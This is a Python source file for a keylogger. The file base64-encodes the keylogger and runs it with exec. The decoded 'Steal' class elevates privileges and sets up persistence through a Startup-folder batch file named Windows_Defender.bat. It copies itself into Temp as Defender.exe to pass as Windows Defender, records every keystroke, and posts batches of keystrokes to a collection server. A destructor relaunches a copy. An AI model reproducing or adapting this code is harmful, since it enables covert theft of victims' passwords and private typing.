import base64
import keyboard as kb
import requests
from elevate import elevate    
import sys
import os
code = base64.b64encode(b"""

NAME_FLS="mian.exe"                       
SERVER="http://127.0.0.1:5000/getin/it/data"
Name_file="Defender.exe"
BAT=f"start C:/Users/Pavel/AppData/Local/Temp/{Name_file}"
PATH_BAT=r"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/Windows_Defender.bat"
PATH_COPY=f"C:/Users/Pavel/AppData/Local/Temp/{Name_file}"
SERVER2="http://127.0.0.1:5000/connect"

MY_NAME=sys.argv[0]
  

class Steal:

    def __init__(self, server=SERVER):
        self.server = server
        self.data = []
        self.bug = []
        self.limit = 100
        self.path_to=PATH_COPY
        if not (Name_file == NAME_FLS):
            elevate()
            self.write_in_autoload()
            self.create_copy()

    def get_key(self):
        return kb.read_key()
    
    def write_in_autoload(self):
        try:
            with open(PATH_BAT,"w",encoding="UTF-8") as f:
                f.write(self.path_to)
        except PermissionError:
            pass
        
    def create_copy(self,way=PATH_COPY):
        try:
            with open(MY_NAME,"rb") as f:
                fil=f.read()
            with open(way,"wb") as f:
                f.write(fil)
        except:
            pass
    
    def connect_server(self):
        try:
            if requests.get(SERVER2):
                return 1
            else:
                return 0
        except:
            return 0
                    
    
    def send(self):
        if self.connect_server():
            if self.bug!=[]:
                requests.post(self.server, json={"data": self.bug})
                self.bug.clear()
                self.data.clear()
            elif len(self.data)>=self.limit:
                requests.post(self.server, json={"data": self.data})
                self.data.clear()
            else:
                return 1
        else:
            self.bug.extend(self.data)

    def run(self):
        while True:
            self.send()
            self.data.append(self.get_key())
            
    def __del__(self):
        self.create_copy("C:/Users/Pavel/AppData/Roaming/NO.exe")
        os.system("start C:/Users/Pavel/AppData/Roaming/NO.exe")
        
        
if __name__=="__main__":
    app = Steal()
    app.run()
""")
exec(base64.b64decode(code))